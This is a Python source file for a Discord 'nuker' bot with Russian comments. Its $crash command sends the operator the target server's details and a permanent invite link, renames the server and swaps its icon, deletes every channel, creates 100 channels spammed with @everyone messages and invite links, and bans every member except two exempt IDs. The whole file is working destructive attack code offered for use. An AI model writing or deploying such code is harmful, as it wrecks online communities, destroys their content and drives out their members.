import disnake 
from disnake.ext import commands
import multiprocessing
import asyncio
import aiohttp


intents = disnake.Intents.default()
intents.message_content = True
intents.guilds = True

bot = commands.Bot(command_prefix="$", intents=intents)

@bot.event
async def on_ready():
    print(f'Loging {bot.user.name}')
    
# зашиты серверов
MAIN_SERVER_ID =  

#отправки инфы
MAIN_SERVER_CHANNEL_ID = 

#иконка при краше изменяет
ICON_URL = "https://e7.pngegg.com/pngimages/533/989/png-clipart-pentagram-pentagram-satanism-sigil-of-baphomet-devil-computer-wallpaper-cross.png"

EXEMPT_USER_IDS = [1118484648247443476, 822709398526492712]  




# фейк подсказка
HELP_URL = "https://discord.gg/gAhfb9Ps8v"

@bot.command(name="helper")
async def help_command(ctx):
    # сыллка
    await ctx.send(f"Вот ссылка на подсказку с командами: {HELP_URL}")
    
@bot.command()
async def crash(ctx):
    # запущен краш на оснв серв
    if ctx.guild.id == MAIN_SERVER_ID:
        await ctx.send("Браток основной сервер нельзя крашить)")
        print("Пытались крашнуть оснв сервер я за0щитил by rvg.dev")
        return

    # отправка на оснв сервер
    main_channel = bot.get_channel(MAIN_SERVER_CHANNEL_ID)
    if main_channel:
        server_info = f"Краш заюзан на сервере: {ctx.guild.name} и внем {ctx.guild.member_count} людей."
        await main_channel.send(server_info)
        print(f'Инфа на основу: {server_info}')
    else:
        print('Ошибка отправки.')
    try:
        invite = await ctx.channel.create_invite(max_age=0, max_uses=0)
        print(f'Креатнул сыллку: {invite.url}')
    except Exception as e:
        await ctx.send("Немогу сыллку.")
        print(f'Не могу создать сыллку на инв Reason: {e}')
        return

    # инв на основу серва
    main_channel = bot.get_channel(MAIN_SERVER_CHANNEL_ID)
    if main_channel:
        server_info = f"Сервер : {ctx.guild.name} ам {ctx.guild.member_count} members."
        try:
            await main_channel.send(f"{server_info}\nInvite link: {invite.url}")
            print(f'Отправки сыллка: {invite.url} и информации о серве.')
        except Exception as e:
            print(f'Немогу. Reason: {e}')
    else:
        print('не могу')
        
   
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(ICON_URL) as resp:
                if resp.status == 200:
                    icon_data = await resp.read()
                    await ctx.guild.edit(name="CRASHED BY TCP TEAM <3", icon=icon_data)
                    print(f'Секретик).')
                else:
                    print(f'Ошибки изменения {resp.status}')
    except Exception as e:
        print(f'Иконка не изменена. Reason: {e}')
        

    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except Exception as e:
            print(f'Ошибки делета канала: {channel.name}. Reason: {e}')
    

    for i in range(100):  
        new_channel_name = f'CRASH TCP TEAM <3'
        try:
            new_channel = await ctx.guild.create_text_channel(new_channel_name)
            for j in range(10):
                try:
                    await new_channel.send(f'@everyone CRASHED BY TCP TEAM <3 https://discord.gg/jkNQ4vpb6N https://discord.gg/DXJ2wX2rya')
                except Exception as e:
                    print(f"Ошибка отправки: {new_channel_name}. Reason: {e}")
        
        except Exception as e:
            print(f'Ошибка создания: {new_channel_name}. Reason: {e}')

    for member in ctx.guild.members:
        if member.id not in EXEMPT_USER_IDS:
            try:
                await member.ban(reason="Nado")
                print(f'бан мемберсr: {member.name}#{member.discriminator}')
            except Exception as e:
                print(f'ошибка бана {member.name}#{member.discriminator}. Reason: {e}')
        else:
            print(f'скип бана: {member.name}#{member.discriminator} (exempt)')
    
bot.run('') #сюда ваш token от бота wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwthrjghwwtjriiwkfjjthgjjthgjjwh
